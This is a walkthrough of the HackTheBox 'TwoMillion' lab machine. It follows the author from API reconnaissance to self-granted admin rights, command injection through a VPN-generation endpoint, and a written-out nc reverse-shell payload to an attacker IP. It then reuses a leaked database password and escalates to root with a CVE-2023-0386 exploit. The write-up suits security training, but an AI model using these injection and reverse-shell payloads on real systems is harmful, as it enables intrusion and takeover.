[Twomillion](https://app.hackthebox.com/machines/TwoMillion) is a machine on HTB Labs. We use **subdirectory-fuzzing** and the page source-code to find access to an **API**. We find some **ROT13** encrypted information there which tells us how to generate an invite key through the API. We then misuse a misconfiguration in this API to make ourselves an admin.  Finally we use a known **FUSE CVS** to gain root-access.

## Reconnaissance

As always, we receive an IP addres: `10.10.11.221`. First, we want to get a general overview of this machine and the services running on it. For that, we use our trusty `nmap` to find any interesting open or filtered ports.

```bash
sudo nmap -sC -sV -oN nmap/initial.out 10.10.11.221
```

Here `-sC` and `-sV` run some scripts to determine services and their versions running on the ports. `-oN` generates an output file for us for future referencing.

We get the following output:

```
Nmap scan report for 10.10.11.221
Host is up (0.012s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

This tells us that we have an open SSH port - which is not useful now but might come in handy later - and an open HTTP port 80. We also see it is running an Nginx server and that the server had tried to redirect us to `http://2million.htb/`.

Let's investigate the website by navigating to `http://10.10.11.221:80`. When we do this, we indeed immediately get hit with a redirect to `http://2million.htb/`. However, this is not a public domain, so our browser cannot resolve the hostname and generates an error page. We can assume, however, that this domain is actually hosted on this IP address, but that the webserver only allows traffic for that specific hostname and not for just an IP address. The reason for this might be that the server hosts multiple domains and it needs to know which one a visitor is looking for. We can confirm this assumption by using `cURL` to add a `Host` header to our HTTP request.

```bash
curl 10.10.11.221 -H 'Host: 2million.htb'
```

And indeed, we get a fully working `.html` file in return. Supplying the cookie manually for each request is cumbersome, so instead we can add this hostname to our local DNS files.

```bash
sudo sh -c 'echo "10.10.11.221  2million.htb" >> /etc/hosts'
```

Now we can simply visit `2million.htb` and our browser will handle the rest. 

Navigating the website a bit, we see that it is actually an older and deprecated version of HTB. Most pages seem to be non-existent, but there are a few interesting ones that we can visit and seem operational: `/login` and `/invite` or `/register`. The first is a login-page, but since we do not have an account yet this does not seem to be of use right now. The second is a way to create an account, for which you need an invite code. On the page it says "Feel free to hack your way in :)", so we can safely assume we're looking in the right place.

Before we start hacking on the invite code though, we might want to get even more of an overview of the website. It's always a good idea to finish a wide reconnaissance phase first before diving into a specific rabbit hole, as you might just miss vital information. There might be pages that are not accessible from the main page but are still interesting. To find out, we'll use `ffuf`, a web-fuzzer that will bruteforce commonly used subpage/subdirectory names and hopefully find some of them for us.

```bash
ffuf -u http://10.10.11.221:80/FUZZ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -H 'Host: 2million.htb' -c -fc 301
```

We use a wordlist from the well-known [SecLists](https://github.com/danielmiessler/SecLists) repo and add `-H 'Host: 2million.htb` to prevent the redirect. We also add `-fc 301` to filter out any response code 301, which is a redirect and is thrown every time we try to request a page that does not exist. (`-c` colourizes the output.) We get the following results:

```
home                    [Status: 302]
login                   [Status: 200]
register                [Status: 200]
api                     [Status: 401]
404                     [Status: 200]
0404                    [Status: 200]
invite                  [Status: 200]
```

Indeed, we find two new pages of interest: `/home` and `/api`. `/home` redirects us to the login page (though with a 302 code, not a 301 code). Judging by the name of the page and the different kind of redirect, we can assume it's the home-page for logged in users. `/api` responds with a 401 code, which means we are not authorized to access this page at all. 

So it seems we have gained no additional places to look for now, but these are definitely pages we might want to check out later. It looks like the next step is to hack the invite code and create an account, so that we hopefully get access to some more parts of the website.

## Hacking the invite code

So, on to hacking the invite code. A good first idea is to look at the source code on the `/invite` page, to see if there's any code related to verifying the code. And indeed, we find a snippet of javascript code at the bottom that makes a POST request to some subpage of the `/api` page we found before, to verify it. There is also a reference to another javascript source file over at `/js/inviteapi.min.js`, so let's make a request for that file using `cURL`. 

```bash
curl 2million.htb/js/inviteapi.min.js
```

On inspecting it, we find the same snippet of code and in addition a function `makeInviteCode()` relating to generating an invite code. In it, we see a POST request being made to `/api/v1/invite/how/to/generate`. Interesting... Let's make such a request and see what the response is:

```bash
curl 2million.htb/api/v1/invite/how/to/generate -H 'Content-Type: application/json' -X POST
```

Here we use `-H 'Content-Type: application/json'` because we see that's the same application type used in the javascript code. `-X POST` specifies we want to make a POST request (the default is GET).

We receive:

```
{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}
```

Judging by the hint as well as the general look of the text in the `data` field, we can assume it's some text that's been 'encrypted' using [ROT13](https://en.wikipedia.org/wiki/ROT13). Cool, let's use a ROT13 [decryptor](https://rot13.com/) to find the original data.

```
In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate
```

Nice, so we can generate our own invite code using a POST request to `/api/v1/invite/generate` and use it to create an account. 

```bash
curl -X POST 2million.htb/api/v1/invite/generate
```

When making the POST request we get a response: `N0cxVkktMVc4UUMtTUY5MDUtRkZJQUE=`. Which, when decoded from base64, becomes a valid invite code.

## Becoming an admin
After making an account using the invite code, we are indeed met with the `/home` page as expected. Browsing around a bit, we find an interesting page here at `/access` which tells us that users can download an OpenVPN file to connect to the HTB network.

For now, let's take a look at the `/api` page we discovered earlier. We find that we can indeed access it now, and that it points us to `/api/v1`. On that page, we find what seems to be instructions to use this API v1. Some of the uses were already known to us, such as `/api/v1/invite/how/to/generate`, but some are new. Most interesring, we find a section called `admin`, which allows us to "check if a user is admin", "update user settings", "generate VPN for specific user", using GET, PUT and POST requests respectively. One would assume that admins are able to:
- check other users' admin status
- make other users admin
- generate a VPN file for any specified user

It seems that getting access to an admin account is the right way to go. More specifically, we suspect the following: Since admins can generate a VPN file for any user, they would have to supply a user name and the server would have to handle that string in some way. Since it's an admin-only action, the server might not have any string sanitization in place, allowing us the sneak some code injection in through this username.

So we have a possible point of attack, but how do we become admin? Let's check what happens when we make a PUT request to the `/api/v1/admin/settings/update` endpoint. 

```bash
curl -X PUT 2million.htb/api/v1/admin/settings/update -H 'Cookie: PHPSESSID=s9jrounrs12glo29i8u856rib8' -H 'Content-Type: application/json'
```

> In order to use `cURL` as a newly created user, we can grab the session cookie that our browser is supplying the website to prove we're still logged in. Then add that cookie to a `curl` request by using `-H 'Cookie: PHPSESSID={yourcookie}'`

We receive the following response:

```
{"status":"danger","message":"Missing parameter: email"}
```

Hmm, It's asking us for the user email. It actually looks like this API endpoint for making a user an admin, can be operated by a non-admin. Let's supply the email

```bash
curl 2million.htb/api/v1/admin/settings/update -H 'Cookie: PHPSESSID=s9jrounrs12glo29i8u856rib8' -v -X PUT -H 'Content-Type: application/json' -d '{"email":"test1234@test.com"}'
```

It then tells us it needs a `is_admin` value, so let's supply that too. Trying some different variations of `True`, `true` and finally `1` gets us a positive response:

```bash
curl 2million.htb/api/v1/admin/settings/update -H 'Cookie: PHPSESSID=s9jrounrs12glo29i8u856rib8' -v -X PUT -H 'Content-Type: application/json' -d '{"email":"test1234@test.com", "is_admin":1}'
```

```bash
{"id":16,"username":"test1234","is_admin":1}
```

Nice! We can now even use the `/api/v1/admin/auth` to verify this. Now, let's see if our assumptions about the command injection were correct.

## Initial foothold
Let's make a request to `/admin/vpn/generate` to see what happens. The response we get is `{"status":"danger","message":"Missing parameter: username"}`. Okay, let's add a username with `-d '{"username":"test1234"}'`. The server ends up sending us an OpenVPN file as expected. Now that we know how to generate such a request, let's see if we can tweak it in order to inject some command in there. To reiterate; we suspect that the parsing of the `username` field is not done safely and its contents might be put in some sort of `system()` command. We make the following request:

```bash
curl 2million.htb/api/v1/admin/vpn/generate -H 'Cookie: PHPSESSID=hvhiclnfmtpgtacqfi5djt31bc' -v -X POST -H 'Content-Type: application/json' -d '{"username":";id;"}'
```

And indeed the response we get is `uid=33(www-data) gid=33(www-data) groups=33(www-data)`, meaning the `id` command was successfully run on the server. Let's use a reverse shell command to get a shell as this `www-data` user going: `{"username":";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.100 1234 >/tmp/f;"}`. Of course, make sure we first have something listening on our machine to catch the shell with `nc -lvnp 1234`

Let's take a look in the `/home` folder for any users, since that's where HTB flags are often located. We find just one user with a home directory, called `admin`. Of course, it seems we'll need their credentials in order to access the `user.txt` file. Let's take a look around this `www-data` users folder that we landed in. 

We find a file called `.env` and in it we find the following information: `DB_USERNAME=admin, DB_PASSWORD=SuperDuperPass123`. Looks like these are the login credentials for some database for a uses called `admin`. May we assume this user used the same password for their user account on this machine? Let's try by SSHing into this user's account and supplying this password.

```bash
ssh admin@10.10.11.221
```

Doing this we indeed get a shell as the `admin` user. Great, now we can `cat` the contents of the `user.txt` and we have finally owned the user part of this machine. Nice!

## Getting root access
Loggin in as the user `admin` we get greeted by a message stating `you have mail`. Assuming this is a hint of some sorts, let's see if we can find any interesting mails on this machine. Over at `/var/mail` we indeed find a file called `admin` and in it is the following email:
```
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

Seems like they were concerned about some exploit on FUSE/OverlayFS that this machine is susceptible to. Googling around we find [CVE-2023-0386](https://nvd.nist.gov/vuln/detail/CVE-2023-0386) and a [script](https://github.com/sxlmnwb/CVE-2023-0386) that exploits it. We can use `git` to clone the script to our local machine and use `scp` to bring it over to the target. Let's inspect its contents. We find a README file with instructions:

```
Start two terminals and in the first one type

./fuse ./ovlcap/lower ./gc

In the second terminal type

./exp
```

Okay, let's try! We'll open another terminal and again log in to the `admin` account using the credentials we found and SSH.

After running the commands listed in the instructions, we find that our second terminal suddenly changes to a session as `root`. 

Great, now we can read out the contents of `root.txt` in the `/root` directory (again, this is usually where HTB places them) and we have completely pwned this box!